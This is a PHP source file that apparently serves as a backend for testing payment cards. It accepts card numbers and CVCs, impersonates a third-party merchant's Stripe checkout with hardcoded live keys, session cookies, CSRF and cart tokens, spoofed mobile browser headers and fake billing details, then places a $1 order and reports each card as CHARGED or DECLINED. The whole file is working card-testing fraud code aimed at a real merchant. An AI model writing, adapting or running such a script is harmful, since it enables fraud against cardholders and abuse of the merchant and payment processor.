
<?php
// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// Include API key validation
require_once __DIR__ . '/validkey.php';
validateApiKey();

// Validate session for non-admin users
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
        error_log("Unauthorized access to stripe1$.php: Invalid session");
        http_response_code(401);
        echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
        exit;
    }
}

// Set content type to JSON
header('Content-Type: application/json');

// Get card details from JSON input (sent by index.js)
$input = json_decode(file_get_contents('php://input'), true);
$cardNumber = $input['card']['number'] ?? '';
$expMonth = $input['card']['exp_month'] ?? '';
$expYear = $input['card']['exp_year'] ?? '';
$cvc = $input['card']['cvc'] ?? '';

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    error_log("Missing card details in stripe1$.php: " . json_encode($input));
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// First API call to create payment method
$headers = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
];

$data = 'billing_details[address][city]=Oakford' .
        '&billing_details[address][country]=US' .
        '&billing_details[address][line1]=Siles+Avenue' .
        '&billing_details[address][line2]=' .
        '&billing_details[address][postal_code]=19053' .
        '&billing_details[address][state]=PA' .
        '&billing_details[name]=Geroge+Washintonne' .
        '&billing_details[email]=grogeh%40gmail.com' .
        '&type=card' .
        '&card[number]=' . urlencode($cardNumber) .
        '&card[cvc]=' . urlencode($cvc) .
        '&card[exp_year]=' . urlencode($expYear) .
        '&card[exp_month]=' . urlencode($expMonth) .
        '&allow_redisplay=unspecified' .
        '&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent' .
        '&referrer=https%3A%2F%2Fwww.onamissionkc.org' .
        '&time_on_page=145592' .
        '&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a' .
        '&client_attribution_metadata[merchant_integration_source]=elements' .
        '&client_attribution_metadata[merchant_integration_subtype]=payment-element' .
        '&client_attribution_metadata[merchant_integration_version]=2021' .
        '&client_attribution_metadata[payment_intent_creation_flow]=deferred' .
        '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified' .
        '&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5' .
        '&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd' .
        '&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48' .
        '&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67' .
        '&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e' .
        '&_stripe_account=acct_1LwocDFHMGxIu0Ep';

$ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$apx = json_decode($response, true);
curl_close($ch);

if ($httpCode != 200 || !isset($apx['id'])) {
    $errorMsg = $apx['error']['message'] ?? 'Unknown error';
    error_log("Stripe payment method creation failed: HTTP $httpCode, Error: $errorMsg");
    echo json_encode(['status' => 'DECLINED', 'message' => $errorMsg]);
    exit;
}

$pid = $apx['id'];

// Second API call to merchant
$cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
           'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
           'ss_cvt=1760724937850; ' .
           '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
           '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';

$headers = [
    'authority: www.onamissionkc.org',
    'accept: application/json, text/plain, */*',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/json',
    'origin: https://www.onamissionkc.org',
    'referer: https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-csrf-token: BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
];

$jsonData = json_encode([
    'email' => 'grogeh@gmail.com',
    'subscribeToList' => false,
    'shippingAddress' => [
        'id' => '',
        'firstName' => '',
        'lastName' => '',
        'line1' => '',
        'line2' => '',
        'city' => '',
        'region' => 'NY',
        'postalCode' => '',
        'country' => '',
        'phoneNumber' => '',
    ],
    'createNewUser' => false,
    'newUserPassword' => null,
    'saveShippingAddress' => false,
    'makeDefaultShippingAddress' => false,
    'customFormData' => null,
    'shippingAddressId' => null,
    'proposedAmountDue' => [
        'decimalValue' => '1',
        'currencyCode' => 'USD',
    ],
    'cartToken' => 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
    'paymentToken' => [
        'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
        'token' => $pid,
        'type' => 'STRIPE',
    ],
    'billToShippingAddress' => false,
    'billingAddress' => [
        'id' => '',
        'firstName' => 'Davide',
        'lastName' => 'Washintonne',
        'line1' => 'Siles Avenue',
        'line2' => '',
        'city' => 'Oakford',
        'region' => 'PA',
        'postalCode' => '19053',
        'country' => 'US',
        'phoneNumber' => '+1361643646',
    ],
    'savePaymentInfo' => false,
    'makeDefaultPayment' => false,
    'paymentCardId' => null,
    'universalPaymentElementEnabled' => true,
]);

$ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_COOKIE, $cookies);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response1 = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$apx1 = json_decode($response1, true);
curl_close($ch);

if ($httpCode != 200 || isset($apx1['failureType'])) {
    $errorMsg = $apx1['failureType'] ?? 'Unknown error';
    error_log("Merchant order submission failed: HTTP $httpCode, Error: $errorMsg");
    echo json_encode([
        'status' => 'DECLINED',
        'message' => 'Your card was declined',
        'response' => $errorMsg
    ]);
    exit;
}

echo json_encode([
    'status' => 'CHARGED',
    'message' => 'Charged $1 successfully',
    'response' => 'CHARGED'
]);
?>
